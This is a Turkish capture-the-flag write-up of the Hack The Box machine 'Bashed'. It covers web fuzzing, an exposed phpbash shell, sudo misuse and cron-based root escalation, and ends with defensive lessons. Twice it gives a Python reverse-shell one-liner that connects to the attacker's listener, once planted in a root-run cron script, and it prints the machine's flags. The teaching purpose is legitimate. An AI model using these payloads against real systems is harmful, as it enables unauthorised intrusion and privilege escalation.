## Hack The Box — Bashed Writeup

**Zorluk:** Easy
**İşletim Sistemi:** Linux (Ubuntu)
**Odak Noktalar:** Web Fuzzing, Exposed Dev Files, Sudo Misconfiguration, Cron-based Privilege Escalation

---

### Giriş

Bashed, HTB'nin klasik "easy" seviye Linux kutularından biri ve bana kalırsa yeni başlayanlar için gerçekten öğretici bir makine. Neden mi? Çünkü tek bir büyük zafiyet üzerinden değil, **art arda gelen küçük yapılandırma hatalarının zincirlenmesiyle** root'a ulaşıyoruz: unutulmuş bir geliştirme dizini → tam yetkili bir web shell → gevşek bırakılmış bir sudo kuralı → root tarafından periyodik çalıştırılan, yazılabilir bir script dizini. Aşağıda bu zinciri baştan sona, her adımda **neden o komutu çalıştırdığımı ve arka planda ne olduğunu** anlatarak ilerleteceğim.

---

### 1. Keşif (Reconnaissance)

Her pentest'te olduğu gibi işe önce hedefi tanımakla başlıyorum. Amacım basit: hangi portlar açık, arkalarında hangi servisler ve versiyonlar çalışıyor?

```bash
nmap -sS -A -T5 -p- 10.129.51.18
```

Full port + `-A` ile OS/versiyon/script taraması. Sonuç net:

```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
```

Tek açık port 80, yani tüm saldırı yüzeyimiz web uygulaması. Başlığın "**Development** Site" olması da bana bir ipucu veriyor: geliştirme ortamlarında genellikle production'a göre çok daha gevşek güvenlik pratikleri olur — unutulmuş dosyalar, debug endpoint'leri, test script'leri...

---

### 2. Web Enumeration

Siteye tarayıcıdan baktığımda görsel olarak fazla bir şey bulamadım — bu normal, çünkü asıl bilgi çoğu zaman **görünmeyen** dizinlerde saklı. Bu yüzden dizin taramasına geçiyorum:

```bash
ffuf -u http://10.129.51.18/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

`ffuf`, `FUZZ` yer tutucusunun bulunduğu yere wordlist'teki her kelimeyi sırayla yerleştirip istek atar ve dönen HTTP durum koduna göre gerçek dizinleri/dosyaları ayıklamamı sağlar. Sonuçlarda dikkatimi çeken birkaç 301 (dizin, yönlendirme var) yanıtı oldu:

```
css      [301]
dev      [301]
fonts    [301]
images   [301]
js       [301]
php      [301]
uploads  [301]
```

`dev` dizini benim için en kritik sinyal — "development" başlığıyla birleşince, orada muhtemelen production'a hiç girmemesi gereken bir şeyler olduğunu düşündüm. Kontrol ettiğimde:

```
http://10.129.51.18/dev/phpbash.php
http://10.129.51.18/dev/phpbash.min.php
```

**phpbash**, açık kaynaklı bir semi-interactive PHP web shell'idir — yani birileri (muhtemelen geliştirme/test amacıyla) bu aracı sunucuya bırakmış ve **kaldırmayı unutmuş**. Bu tür "unutulmuş araçlar", gerçek dünyada da en çok karşılaşılan foothold (ilk erişim) senaryolarından biridir.

---

### 3. Foothold — www-data Olarak Komut Çalıştırma

`phpbash.php` sayfasını açtığımda, tarayıcı üzerinden doğrudan komut çalıştırabildiğim bir shell arayüzü karşıladı beni. Bu aslında bir **Remote Code Execution (RCE)** — sadece hazır bir araç şeklinde paketlenmiş hali. Hızlıca kimliğimi ve ortamı kontrol ettim:

```
www-data@bashed:/home/arrexel# cat user.txt
efd6cb94fd86d921ba0cb64f733e6a46
```

İlk flag'i aldım. Ama phpbash üzerinden çalışmak pratik değil — sayfa her istekte yeniden yükleniyor, komut geçmişi yok, `cd` gibi state gerektiren işlemler garip davranabiliyor. Bu yüzden ilk işim, kendi makineme **tam interaktif bir reverse shell** almak oldu.

#### Reverse Shell Nedir, Neden Kullandım?

İki tür shell yaklaşımı vardır:

* **Bind shell:** Hedef makine bir port açar, ben o porta bağlanırım.
* **Reverse shell:** Hedef makine, **benim dinlediğim** bir porta kendisi bağlanır.

Gerçek dünyada hedefler genellikle firewall/NAT arkasındadır ve dışarıdan içeriye gelen bağlantıları (inbound) engellerler ama içeriden dışarıya giden (outbound) bağlantılara çoğu zaman izin verirler. Bu yüzden reverse shell, pratikte çok daha güvenilir bir yöntemdir — ben de bu mantıkla ilerledim.

Önce kendi makinemde bir dinleyici açtım:

```bash
rlwrap nc -nvlp 4444
```

Sonra phpbash üzerinden şu Python one-liner'ı çalıştırdım:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Standart soket bağlantısı + `dup2` ile fd 0/1/2'nin socket'e yönlendirilmesi, klasik payload — burada asıl dikkat ettiğim nokta payload'ın kendisi değil, **neden bind shell değil de reverse shell tercih ettiğim**: hedef muhtemelen NAT/firewall arkasında, outbound bağlantılara inbound'dan çok daha toleranslı — bu yüzden bağlantıyı hedefin bana kurmasını sağlamak, dışarıdan içeri port açmaya çalışmaktan çok daha güvenilir.

Sonuç olarak dinleyicimde bağlantı düştü:

```
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 46020
/bin/sh: 0: can't access tty; job control turned off
$
```

PTY olmayan yarım bir shell — bu box için yeterli, upgrade etmedim.

---

### 4. Privilege Escalation — www-data'dan scriptmanager'a

Shell'im artık daha kullanışlı, sıradaki adım klasik: **hangi yetkilerle neler yapabiliyorum?**

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Standart bir web sunucusu kullanıcısıyız, özel bir grup üyeliğimiz yok. Bu noktada her zaman kontrol ettiğim ilk şeylerden biri sudo yetkileridir — çünkü çoğu zaman servis hesapları, farkında olmadan geniş sudo izinleriyle bırakılır:

```
$ sudo -l
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Bu satır altın değerinde. Anlamı şu: `www-data` kullanıcısı, **hiçbir şifre girmeden**, `scriptmanager` kullanıcısı kimliğiyle **istediği herhangi bir komutu** çalıştırabilir. Bu, klasik bir "aşırı geniş sudo kuralı" (sudo misconfiguration) örneği — güvenlik ekibi muhtemelen "belirli bir script'i çalıştırabilsin" demek isterken, `ALL` yazarak kapıyı sonuna kadar açık bırakmış.

```bash
sudo -u scriptmanager /bin/bash
```

`-u scriptmanager` parametresi, komutu hangi kullanıcı kimliğiyle çalıştıracağımı belirtir. Bu komutla artık `scriptmanager` kullanıcısı olarak tam bir bash shell'e sahibim — root değilim ama önemli bir yatay/dikey geçiş yaptım.

---

### 5. Privilege Escalation — scriptmanager'dan root'a

`scriptmanager` olarak etrafı incelerken dikkatimi çeken bir dizin vardı:

```
$ ls -ld /scripts
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun  2  2022 /scripts
```

`www-data` iken bu dizine giremiyordum (`Permission denied`), çünkü izinler sadece `scriptmanager` kullanıcısına ve grubuna yazma/okuma hakkı veriyordu. Ama artık `scriptmanager`'ım, yani bu dizin bana açık.

Burada önemli bir ipucu daha var, biraz da tecrübeyle fark edilen bir şey: **böyle "scriptmanager" adında özel bir kullanıcı ve ona ait bir `/scripts` dizini varsa, arkada büyük ihtimalle bir cron job bu dizini periyodik olarak tarayıp içindeki script'leri root yetkisiyle çalıştırıyordur.** Bu tür kutularda genelde `pspy` gibi bir araçla (root yetkisi olmadan çalışan process'leri gözlemleyen bir tool) crontab'ı doğrudan görmeden de hangi process'lerin periyodik çalıştığını tespit edebilirsiniz. Bashed'de tam olarak bu senaryo geçerli: sistemde root'a ait bir cron job, `/scripts` dizinindeki `.py` uzantılı dosyaları düzenli aralıklarla **root yetkisiyle** çalıştırıyor.

Yani mantık zinciri şöyle tamamlanıyor:

1. `/scripts` dizini `scriptmanager` kullanıcısına yazılabilir.
2. Root, arka planda periyodik olarak bu dizindeki script'leri kendi yetkisiyle çalıştırıyor.
3. Ben `scriptmanager` olarak bu dizine dosya yazabiliyorum.
4. **Sonuç:** Buraya kendi reverse shell kodumu yazarsam, root bunu benim için, kendi yetkisiyle çalıştırır.

Bunu doğrulamak/istismar etmek için önce ikinci bir netcat dinleyici açtım (ilk shell'im hâlâ açık kalsın istedim, olası bir sorunda kaybetmemek için):

```bash
rlwrap nc -nvlp 4445
```

Sonra `scriptmanager` shell'imden, `/scripts` dizinine yeni bir Python dosyası oluşturup içine aynı mantıkla çalışan bir reverse shell kodu yazdım:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /scripts/test.py
```

Burada `echo ... >> /scripts/test.py` komutunu kullanmamın nedeni basit: elimde bir metin editörü açma lüksü yok (ya da açmak istemedim), bu yüzden `echo` ile string'i doğrudan dosyaya **ekliyorum** (`>>` — üzerine yazmak yerine sona ekler; `test.py` yoksa oluşturur). İçerik, bir önceki bölümde detaylıca açıkladığım **aynı reverse shell mantığı** — sadece bu sefer IP aynı ama port `4445`, çünkü ilk shell'imle karışmasın istedim.

Kodu yazdıktan sonra tek yapmam gereken **beklemekti** — cron job'un bir sonraki çalışma zamanını bekledim (genelde bu tür kutularda 1 dakikayı geçmez). Ve az sonra ikinci dinleyicimde bağlantı düştü:

```
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 35430
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

`test.py` script'i root'un cron job'u tarafından **root yetkisiyle** çalıştırıldı ve içindeki reverse shell kodu tetiklendi — az önce `scriptmanager` olarak yazdığım dosya, bir dakika içinde bana root shell olarak geri döndü. Kalan iş formaliteydi:

```
# cd /root
# cat root.txt
7296b59278b52eb59fbb3c51f8043a27
```

---

### Özet ve Çıkarımlar

Bu makine, tek başına "kritik" bir CVE barındırmıyor — ama gerçek dünyada sistemleri gerçekten çökerten şeyin de genelde tam olarak bu olduğunu gösteriyor: **birbirine küçük küçük görünen yapılandırma hataları, art arda geldiğinde tam bir zincir oluşturuyor.**

Zincirdeki her adımı ve "bu neden oldu" sorusunu kısaca özetleyeyim:

1. **Unutulmuş geliştirme dosyası (phpbash):** Development ortamında kullanılan bir debug/test aracının production'a taşınıp temizlenmemesi → doğrudan RCE.
2. **Aşırı geniş sudo kuralı (`NOPASSWD: ALL`):** "Bu kullanıcı sadece belirli bir script'i çalıştırabilsin" niyetiyle yazılmış olması muhtemel kural, `ALL` ile sınırsız hale gelmiş.
3. **Root'un kontrolsüz çalıştırdığı cron job:** Root yetkisiyle çalışan bir zamanlanmış görevin, düşük yetkili bir kullanıcı tarafından **yazılabilir** bir dizini taraması — klasik "writable path + privileged execution" kombinasyonu.

Savunma tarafında bakılırsa üç basit önlem bu zinciri en baştan kırardı: geliştirme araçlarının production dağıtımından **CI/CD seviyesinde** hariç tutulması, sudo kurallarının komut bazında **en az yetki (least privilege)** prensibiyle daraltılması ve root tarafından çalıştırılan her script/dizinin **sahiplik ve yazma izinlerinin** düzenli denetlenmesi.

